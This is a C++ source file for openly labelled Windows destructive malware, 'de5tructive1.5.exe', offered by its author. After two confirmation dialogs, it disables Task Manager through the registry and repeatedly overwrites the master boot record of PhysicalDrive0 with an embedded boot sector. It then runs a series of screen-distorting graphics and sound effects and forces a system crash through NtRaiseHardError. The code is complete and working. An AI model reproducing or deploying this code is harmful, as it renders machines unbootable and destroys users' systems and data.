// de5tructive1.5.exe by VietNamLover.
// Don't run this destructive malware on your real PC!
// The safety version won't destroy your PC, your you can run it on your real PC.

#include <windows.h>
#include <wingdi.h>
#pragma comment(lib, "winmm.lib")

typedef RGBTRIPLE* PRGBTRIPLE;

// This is Beziriti.exe's mbr data.
const unsigned char MasterBootRecord[] = {0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBD, 0x00, 0xFA, 0xB0, 0x0F, 0xB9, 
0x00, 0xFA, 0x31, 0xFF, 0xF3, 0xAA, 0x31, 0xC0, 0xBF, 0xA9, 0x00, 0x88, 0x03, 0x4F, 0x79, 0xFB, 
0xC6, 0x46, 0x09, 0x14, 0xBF, 0x00, 0xAF, 0xB1, 0xA0, 0xF3, 0xAB, 0xB9, 0x80, 0x0C, 0xE8, 0x39, 
0x01, 0xE2, 0xFB, 0xFE, 0x4E, 0x08, 0xB0, 0x0F, 0xBF, 0x80, 0x20, 0xB9, 0x80, 0x8E, 0xF3, 0xAA, 
0xB1, 0x27, 0xA1, 0x04, 0xFA, 0x99, 0xF7, 0x36, 0x59, 0x7D, 0x80, 0xC2, 0x30, 0x50, 0x88, 0xD0, 
0x88, 0xCA, 0xBB, 0x0F, 0x00, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xCD, 0x10, 0x58, 0x49, 0x09, 
0xC0, 0x75, 0xE2, 0xB6, 0x07, 0xB9, 0x28, 0x00, 0xBF, 0x0A, 0xFA, 0x8B, 0x1D, 0x08, 0xDB, 0x74, 
0x2A, 0xB2, 0x02, 0x8B, 0x75, 0x02, 0x88, 0xF8, 0xE8, 0xF9, 0x00, 0x28, 0x35, 0x73, 0x1A, 0xFF, 
0x46, 0x04, 0xC6, 0x05, 0x00, 0xA1, 0x04, 0xFA, 0xB3, 0x0A, 0xF6, 0xF3, 0x08, 0xE4, 0x75, 0x09, 
0x80, 0x7E, 0x09, 0x0A, 0x7E, 0x03, 0xFE, 0x4E, 0x09, 0xEB, 0x2A, 0x38, 0x5E, 0x08, 0x7F, 0x25, 
0xA0, 0x09, 0xFA, 0x88, 0x46, 0x08, 0xC7, 0x05, 0xFF, 0x8B, 0xC7, 0x45, 0x02, 0xCE, 0x7D, 0xE5, 
0x40, 0xD0, 0xE8, 0x73, 0x10, 0x83, 0x45, 0x02, 0x08, 0x80, 0x6D, 0x01, 0x12, 0xD0, 0xE8, 0x72, 
0x04, 0x80, 0x6D, 0x01, 0x19, 0xAF, 0xAF, 0xE2, 0xA2, 0xBE, 0x07, 0xFA, 0xBB, 0x06, 0xFA, 0x38, 
0x0F, 0x7E, 0x05, 0x80, 0x2F, 0x07, 0xEB, 0x0B, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x03, 0x74, 0x03, 
0xC6, 0x04, 0x1E, 0x8A, 0x04, 0x3C, 0x00, 0x7E, 0x05, 0x00, 0x07, 0x80, 0x2C, 0x07, 0xB8, 0x8B, 
0x00, 0xBB, 0x23, 0x00, 0x8A, 0x4E, 0x06, 0x38, 0xE1, 0x7E, 0x02, 0x28, 0xC8, 0x50, 0xBA, 0x40, 
0x01, 0xF7, 0xE2, 0x8D, 0x7F, 0x0F, 0x01, 0xC7, 0x26, 0x8A, 0x0D, 0xB4, 0x02, 0xCD, 0x16, 0x34, 
0x04, 0x75, 0x07, 0xB2, 0x02, 0x88, 0x7E, 0x06, 0xEB, 0x09, 0xB2, 0x03, 0x81, 0xEF, 0x3A, 0x1A, 
0x26, 0x22, 0x0D, 0x58, 0xBE, 0xC6, 0x7D, 0xE8, 0x4A, 0x00, 0x08, 0xC9, 0x74, 0x1E, 0xBE, 0x41, 
0xB0, 0xBF, 0x40, 0xB0, 0xB9, 0x7F, 0x0C, 0xF3, 0x26, 0xA4, 0xE8, 0x2D, 0x00, 0xB4, 0x00, 0xCD, 
0x1A, 0x88, 0xD3, 0xCD, 0x1A, 0x30, 0xD3, 0x74, 0xF8, 0xE9, 0xE7, 0xFE, 0xBB, 0x0F, 0x00, 0xBA, 
0x0F, 0x0C, 0xB4, 0x02, 0xCD, 0x10, 0xB4, 0x0E, 0xB9, 0x0A, 0x00, 0xBE, 0xB5, 0x7D, 0xAC, 0xCD, 
0x10, 0xE2, 0xFB, 0xB4, 0x00, 0xCD, 0x16, 0xE9, 0x96, 0xFE, 0xE4, 0x40, 0x24, 0x55, 0x74, 0x02, 
0xB0, 0x0F, 0xAA, 0xC3, 0x51, 0x57, 0x88, 0x46, 0x00, 0x88, 0x5E, 0x02, 0xB3, 0x08, 0x88, 0xD7, 
0x52, 0x8B, 0x46, 0x00, 0xBA, 0x40, 0x01, 0xF7, 0xE2, 0x5A, 0x03, 0x46, 0x02, 0x97, 0xB1, 0x08, 
0x8A, 0x04, 0xD2, 0xE8, 0xB0, 0x00, 0x51, 0x88, 0xD1, 0x72, 0x04, 0x01, 0xCF, 0xEB, 0x02, 0xF3, 
0xAA, 0x59, 0xE2, 0xEC, 0xFF, 0x4E, 0x00, 0xFE, 0xCF, 0x75, 0xD5, 0x88, 0xD7, 0x4E, 0xFE, 0xCB, 
0x75, 0xCE, 0x5F, 0x59, 0xC3, 0x67, 0x61, 0x6D, 0x65, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x21, 0x06, 
0x0D, 0x0F, 0x1E, 0xBC, 0x7A, 0x10, 0x18, 0x1C, 0x22, 0x73, 0x26, 0x6B, 0x22, 0x67, 0x32, 0x03, 
0x07, 0x6E, 0xBF, 0xFF, 0x0E, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}

DWORD WINAPI d(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

DWORD WINAPI pacmans(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}

DWORD WINAPI shake(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCCOPY);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI patblt(LPVOID lpParam)
{
    while (1)
    {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        ReleaseDC(0, hdc);
        DeleteObject(brush);
        Sleep(10);
    }
}

DWORD WINAPI shader1(LPVOID lpParam)
{
    HDC desk = GetDC(0); 
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh, t = x ^ y | x;
            rgbtriple[i].rgbtRed += GetRValue(t ^ y);
            rgbtriple[i].rgbtGreen += GetGValue(x ^ y);
            rgbtriple[i].rgbtBlue += GetBValue(x ^ y);
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); 
        DeleteDC(deskMem); 
        DeleteObject(scr); 
    }
}

DWORD WINAPI shader2(LPVOID lpParam)
{
    HDC desk = GetDC(0); 
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh, t = x ^ y | x;
            rgbtriple[i].rgbtRed += GetRValue(t);
            rgbtriple[i].rgbtGreen += GetGValue(x);
            rgbtriple[i].rgbtBlue += GetBValue(t);
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); 
        DeleteDC(deskMem); 
        DeleteObject(scr); 
    }
}

DWORD WINAPI shader3(LPVOID lpParam)
{   
    HDC desk = GetDC(0); 
    HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            rgbtriple[i].rgbtRed += GetRValue(i) & i;
            rgbtriple[i].rgbtGreen += GetGValue(i) & i;
            rgbtriple[i].rgbtBlue += GetBValue(i) & i;
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); 
        DeleteDC(deskMem); 
        DeleteObject(scr); 
    }
}

DWORD WINAPI payload6(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);
        StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI cubes(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

VOID WINAPI sound1() { // By N17Pro3426 but i remade it.
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(~t*(15596181>>(t>>9&14)&15)|t>>8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t * (-t >> 9 | 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 6 | t << 6));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? 5 : 16) + (1 & t >> 15)) >> (3 & t >> 8) | t >> (t & 4096 ? 2 : 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * -(t >> 8 | t | t >> 9 | t >> 10) ^ t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 9 | t << 7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 2 : 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"The software you just executed is considered malware. This malware will harm your computer and makes it unusable. Are you sure to run this malware?!", L"de5tructive1.5.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING! THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE, STILL EXECUTE IT?! ", 
                    L"de5tructive1.5.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            CreateThread(0, 0, d, 0, 0, 0);
            Sleep(1000);
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(4000);
            HANDLE thread1 = CreateThread(0, 0, pacmans, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            
            HANDLE thread2 = CreateThread(0, 0, wef, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, shake, 0, 0, 0);
            HANDLE thread2dot2 = CreateThread(0, 0, patblt, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2dot1);
            TerminateThread(thread2dot2, 0);
            CloseHandle(thread2dot2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            
            HANDLE thread3 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            
            HANDLE thread4 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            
            HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, pacmans, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            
            HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            TerminateThread(thread7dot1, 0);
            CloseHandle(thread7dot1);
            InvalidateRect(0, 0, 0);
            
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
    Sleep(-1);
}